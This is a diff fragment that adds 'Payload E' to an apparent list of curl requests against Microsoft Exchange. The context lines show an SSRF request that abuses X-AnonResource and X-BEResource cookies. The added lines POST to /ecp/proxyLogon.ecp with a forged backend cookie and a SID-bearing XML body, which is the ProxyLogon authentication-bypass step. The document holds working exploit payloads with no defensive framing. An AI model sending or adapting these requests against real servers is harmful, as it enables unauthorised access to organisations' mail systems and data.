@@ -30,3 +30,11 @@ curl -i -s -k -X $'GET' \
     -H $'Host: 127.0.0.1' -H $'User-Agent: Sk1dd13-02928910918' \
     -b $'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' \
     $'https://externaldomain.local/owa/auth/x.js'
+
+Payload E
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36' -H $'Content-Type: text/xml' -H $'Content-Length: 92' -H $'Connection: close' \
+    -b $'X-BEResource=danger@sserver.internal.local:444/ecp/proxyLogon.ecp?a=~1942062522' \
+    --data-binary $'<r at=\"Negotiate\"\x0d\x0aln=\"jane\"><s>S-1-5-21-1544262530-3153604567-1803344855-1148</s></r>\x0d\x0a\x0d\x0a' \
+    $'https://server.external.local/ecp/z.js'
